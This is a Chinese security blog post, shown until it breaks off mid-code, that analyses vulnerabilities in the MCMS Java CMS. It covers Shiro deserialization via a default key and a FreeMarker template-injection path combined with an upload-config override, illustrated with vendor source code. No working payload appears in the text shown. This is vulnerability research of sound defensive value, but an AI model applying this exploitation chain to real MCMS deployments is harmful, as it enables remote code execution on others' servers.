<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="又又又是一个属性覆盖带来的漏洞想到最近出了好几个与属性覆盖有关的漏洞，突然想到有一个国产系统也曾经出过这类问题，比较有趣这里简单分享一下，希望把一些东西串起来分享方便学到一些东西 前后端框架信息梳理首先简单从官网可以看出所使用的框架信息以及技术选型 https:&#x2F;&#x2F;gitee.com&#x2F;mingSoft&#x2F;MCMS?_from&#x3D;gitee_search 我们主要关注几个点一个是shiro，一个是fre"><meta property="og:type" content="article"><meta property="og:title" content="又又又是一个属性覆盖带来的漏洞"><meta property="og:url" content="https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="又又又是一个属性覆盖带来的漏洞想到最近出了好几个与属性覆盖有关的漏洞，突然想到有一个国产系统也曾经出过这类问题，比较有趣这里简单分享一下，希望把一些东西串起来分享方便学到一些东西 前后端框架信息梳理首先简单从官网可以看出所使用的框架信息以及技术选型 https:&#x2F;&#x2F;gitee.com&#x2F;mingSoft&#x2F;MCMS?_from&#x3D;gitee_search 我们主要关注几个点一个是shiro，一个是fre"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/image-20231228213327055.png"><meta property="article:published_time" content="2023-12-28T13:26:01.000Z"><meta property="article:modified_time" content="2024-08-04T09:01:49.890Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Java"><meta property="article:tag" content="代码审计"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/image-20231228213327055.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>又又又是一个属性覆盖带来的漏洞</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2024/01/04/year/2024/1/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E5%9C%A8IDEA%E4%B8%AD%E7%A8%8B%E5%BA%8F%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E6%88%96%E6%AD%A3%E5%9C%A8Debug/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2023/12/27/year/2023/12/Apache-OFBiz%E6%9C%AA%E6%8E%88%E6%9D%83%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90-CVE-2023-51467/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&text=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&is_video=false&description=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=又又又是一个属性覆盖带来的漏洞&body=Check out this article: https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&title=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&name=又又又是一个属性覆盖带来的漏洞&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/&t=又又又是一个属性覆盖带来的漏洞"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">又又又是一个属性覆盖带来的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%90%8E%E7%AB%AF%E6%A1%86%E6%9E%B6%E4%BF%A1%E6%81%AF%E6%A2%B3%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">前后端框架信息梳理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E7%89%88%E6%9C%AC-lt-5-2-8"><span class="toc-number">1.2.</span> <span class="toc-text">Shiro反序列化(版本&lt;&#x3D;5.2.8 )</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E6%A8%A1%E6%9D%BFSSTIRCE%E5%88%A9%E7%94%A8%E5%8F%B2"><span class="toc-number">1.3.</span> <span class="toc-text">前台模板SSTIRCE利用史</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#V-lt-5-2-5"><span class="toc-number">1.3.1.</span> <span class="toc-text">V&lt;&#x3D;5.2.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V-lt-5-2-8"><span class="toc-number">1.3.2.</span> <span class="toc-text">V&lt;&#x3D;5.2.8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V-lt-5-3-5-%E7%9B%AE%E5%89%8D%E6%9C%80%E6%96%B0%E7%89%88"><span class="toc-number">1.3.3.</span> <span class="toc-text">V&lt;&#x3D;5.3.5(目前最新版)</span></a></li></ol></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">又又又是一个属性覆盖带来的漏洞</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2023-12-28T13:26:01.000Z" class="dt-published" itemprop="datePublished">2023-12-28</time> (Updated: <time datetime="2024-08-04T09:01:49.890Z" class="dt-updated" itemprop="dateModified">2024-08-04</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/Java/">Java</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="又又又是一个属性覆盖带来的漏洞"><a href="#又又又是一个属性覆盖带来的漏洞" class="headerlink" title="又又又是一个属性覆盖带来的漏洞"></a>又又又是一个属性覆盖带来的漏洞</h1><p>想到最近出了好几个与属性覆盖有关的漏洞，突然想到有一个国产系统也曾经出过这类问题，比较有趣这里简单分享一下，希望把一些东西串起来分享方便学到一些东西</p><h2 id="前后端框架信息梳理"><a href="#前后端框架信息梳理" class="headerlink" title="前后端框架信息梳理"></a>前后端框架信息梳理</h2><p>首先简单从官网可以看出所使用的框架信息以及技术选型</p><p><a target="_blank" rel="noopener" href="https://gitee.com/mingSoft/MCMS?_from=gitee_search">https://gitee.com/mingSoft/MCMS?_from=gitee_search</a></p><p>我们主要关注几个点一个是shiro，一个是freemarker，还有就是具体的一些未鉴权的功能点，同时支持两种部署方式jar/war</p><p>关于路由的说明，在启动类当中，指出了扫描的包名前缀为net.mingsoft</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication(scanBasePackages = &#123;&quot;net.mingsoft&quot;&#125;)</span></span><br><span class="line"><span class="meta">@MapperScan(basePackages=&#123;&quot;**.dao&quot;,&quot;com.baomidou.**.mapper&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ServletComponentScan(basePackages = &#123;&quot;net.mingsoft&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MSApplication</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SpringApplication.run(MSApplication.class, args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此与路由相关函数只会出现在三个地方</p><ol><li>源目录下</li><li>ms-basic依赖包下</li><li>ms-mdiy依赖包下</li></ol><p>这个系统曾出现过很多漏洞，各类后台文件上传利用，注入、任意文件删除等等，但其实都比较鸡肋不适合学习</p><h2 id="Shiro反序列化-版本-lt-5-2-8"><a href="#Shiro反序列化-版本-lt-5-2-8" class="headerlink" title="Shiro反序列化(版本&lt;=5.2.8 )"></a>Shiro反序列化(版本&lt;=5.2.8 )</h2><p>在开始前先简单我们知道shiro的版本高低只是加密方式的改变，实际上反序列化漏洞依然存在，如果系统使用了默认的key那也是存在潜在风险的，而恰好在MCMS&lt;=5.2.8版本下都使用了默认的key，使用这个key生成payload，直接打CB链即可<img src="/2023/12/28/year/2023/12/%E5%8F%88%E5%8F%88%E5%8F%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%BC%8F%E6%B4%9E/image-20231228213327055.png" alt="image-20231228213327055"></p><p>接下来我们重点看另一个漏洞</p><h2 id="前台模板SSTIRCE利用史"><a href="#前台模板SSTIRCE利用史" class="headerlink" title="前台模板SSTIRCE利用史"></a>前台模板SSTIRCE利用史</h2><p>接下来我们看另一个漏洞，和模板相关的漏洞</p><p>因为这里的模板渲染使用了<code>freemarker</code>，我们便有两个思路：</p><ol><li>版本是否在漏洞版本</li><li>写法是否安全</li></ol><p>在MCMS中关于模板的渲染处理，是通过封装了一个工具类做的处理，在依赖包<code>ms-mdiy</code>中的<code>net.mingsoft.mdiy.util.ParserUtil#rendering</code>做处理</p><p>MCMS是在5.1版本开始使用<code>freemarker</code>做模板渲染，并且版本一直没有改变过，传家宝<code>&quot;2.3.31&quot;</code></p><p>对于freemarker的模板，通常是通过api与new进行的利用，当然也有利用限制</p><p>对于内置函数api</p><p><code>api_builtin_enabled</code>为<code>true</code>时才可使用api函数，而该配置在2.3.22版本之后默认为<code>false</code></p><p>对于内置函数new</p><p>从 2.3.17版本以后，官方版本提供了三种TemplateClassResolver对类进行解析：</p><p>1、UNRESTRICTED_RESOLVER：可以通过 <code>ClassUtil.forName(className)</code>获取任何类。</p><p>2、SAFER_RESOLVER：不能加载<code>freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor</code>这三个类。</p><p>3、ALLOWS_NOTHING_RESOLVER：不能解析任何类。</p><p>可通过<code>freemarker.core.Configurable#setNewBuiltinClassResolver</code>方法设置<code>TemplateClassResolver</code>，从而限制通过new()函数对<code>freemarker.template.utility.JythonRuntime、freemarker.template.utility.Execute、freemarker.template.utility.ObjectConstructor</code>这三个类的解析</p><p>尽管MCMS的漏洞版本比较高，但是他在5.8版本以下并未对内置函数new做严格限制，具体我们可以看看<code>net.mingsoft.mdiy.util.ParserUtil#rendering</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">rendering</span><span class="params">(Map root, String content)</span> <span class="keyword">throws</span> IOException, TemplateException </span>&#123;</span><br><span class="line">    Configuration cfg = <span class="keyword">new</span> Configuration(Configuration.VERSION_2_3_0);</span><br><span class="line">    StringTemplateLoader stringLoader = <span class="keyword">new</span> StringTemplateLoader();</span><br><span class="line">    stringLoader.putTemplate(<span class="string">&quot;template&quot;</span>, content);</span><br><span class="line">    cfg.setNumberFormat(<span class="string">&quot;#&quot;</span>);</span><br><span class="line">    cfg.setTemplateLoader(stringLoader);</span><br><span class="line">    Template template = cfg.getTemplate(<span class="string">&quot;template&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">    StringWriter writer = <span class="keyword">new</span> StringWriter();</span><br><span class="line">    template.process(root, writer);</span><br><span class="line">    <span class="keyword">return</span> writer.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然在freemarker版本在较安全的版本，但并未配置new-builtin-class-resolver，因此接下来我们只需要找到调用的点即可</p><p>在高版本后5.2.9，开发者终于意识到这个问题，设置了<code>cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);</code></p><p>回到正题，这里我们先从较低的版本说起，以5.2.5来做例子</p><h3 id="V-lt-5-2-5"><a href="#V-lt-5-2-5" class="headerlink" title="V&lt;=5.2.5"></a>V&lt;=5.2.5</h3><p>首先是一个能任意控制模板渲染的函数</p><p>这个路由非常好找，就在源码路径下为数不多不是CRUD功能的类中<code>net.mingsoft.cms.action.web.MCmsAction#search</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实现前端页面的文章搜索</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request  搜索id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;search&quot;,method = &#123;RequestMethod.GET, RequestMethod.POST&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">search</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        String search = BasicUtil.getString(<span class="string">&quot;tmpl&quot;</span>, <span class="string">&quot;search.htm&quot;</span>);</span><br><span class="line">				............</span><br><span class="line">        <span class="comment">//解析后的内容</span></span><br><span class="line">        String content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//根据模板路径，参数生成</span></span><br><span class="line">            content = ParserUtil.rendering(search, params);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (TemplateNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedTemplateNameException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以这里通过<code>tmpl</code>参数能实现渲染文件的完全控制，但是</p><p>在<code>ParserUtil.getPageSize(search, 20)</code>当中我们会发现，其读取文件过程中使用了<code>hutool</code>的<code>FileUtil.file</code>,在这个第三方工具类使用了checkSlip防止目录穿越，因此非常可惜我们现在能渲染任意路径下的文件了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title">checkSlip</span><span class="params">(File parentFile, File file)</span> <span class="keyword">throws</span> IllegalArgumentException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">null</span> != parentFile &amp;&amp; <span class="keyword">null</span> != file) &#123;</span><br><span class="line">        String parentCanonicalPath;</span><br><span class="line">        String canonicalPath;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            parentCanonicalPath = parentFile.getCanonicalPath();</span><br><span class="line">            canonicalPath = file.getCanonicalPath();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IORuntimeException(var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!canonicalPath.startsWith(parentCanonicalPath)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;New file is outside of the parent dir: &quot;</span> + file.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那要想实现，那必须找到一个能够控制任意路径上传，或者能够配合目录穿越跳转的上传点，这个系统中正好就有，在<code>net.mingsoft.basic.action.web.EditorAction#editor</code>中，参数传入后交给了<code>MsUeditorActionEnter</code>类继续处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">editor</span><span class="params">(HttpServletRequest request, HttpServletResponse response, String jsonConfig)</span> </span>&#123;</span><br><span class="line">    String rootPath = BasicUtil.getRealPath(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    File saveFloder = <span class="keyword">new</span> File(<span class="keyword">this</span>.uploadFloderPath);</span><br><span class="line">    <span class="keyword">if</span> (saveFloder.isAbsolute()) &#123;</span><br><span class="line">        rootPath = saveFloder.getPath();</span><br><span class="line">        jsonConfig = jsonConfig.replace(<span class="string">&quot;&#123;ms.upload&#125;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        jsonConfig = jsonConfig.replace(<span class="string">&quot;&#123;ms.upload&#125;&quot;</span>, <span class="string">&quot;/&quot;</span> + <span class="keyword">this</span>.uploadFloderPath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String json = (<span class="keyword">new</span> MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(<span class="string">&quot;&quot;</span>))).exec();</span><br><span class="line">    <span class="keyword">if</span> (saveFloder.isAbsolute()) &#123;</span><br><span class="line">        Map data = (Map)JSON.parse(json);</span><br><span class="line">        data.put(<span class="string">&quot;url&quot;</span>, <span class="keyword">this</span>.uploadMapping.replace(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;&quot;</span>) + data.get(<span class="string">&quot;url&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> JSON.toJSONString(data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MsUeditorActionEnter</span><span class="params">(HttpServletRequest request, String rootPath, String jsonConfig, String configPath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(request, rootPath);</span><br><span class="line">    <span class="keyword">if</span> (jsonConfig != <span class="keyword">null</span> &amp;&amp; !jsonConfig.trim().equals(<span class="string">&quot;&quot;</span>) &amp;&amp; jsonConfig.length() &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI()));</span><br><span class="line">        ConfigManager config = <span class="keyword">this</span>.getConfigManager();</span><br><span class="line">        setValue(config, <span class="string">&quot;rootPath&quot;</span>, rootPath);</span><br><span class="line">        JSONObject _jsonConfig = <span class="keyword">new</span> JSONObject(jsonConfig);</span><br><span class="line">        JSONObject jsonObject = config.getAllConfig();</span><br><span class="line">        Iterator iterator = _jsonConfig.keys();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">            String key = (String)iterator.next();</span><br><span class="line">            jsonObject.put(key, _jsonConfig.get(key));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在初始化过程中，先初始化了父类，这里可以看到，<code>actionType</code>受我们传入的参数控制，这个参数决定了方法的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ActionEnter</span><span class="params">(HttpServletRequest request, String rootPath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.request = request;</span><br><span class="line">    <span class="keyword">this</span>.rootPath = rootPath;</span><br><span class="line">    <span class="keyword">this</span>.actionType = request.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">    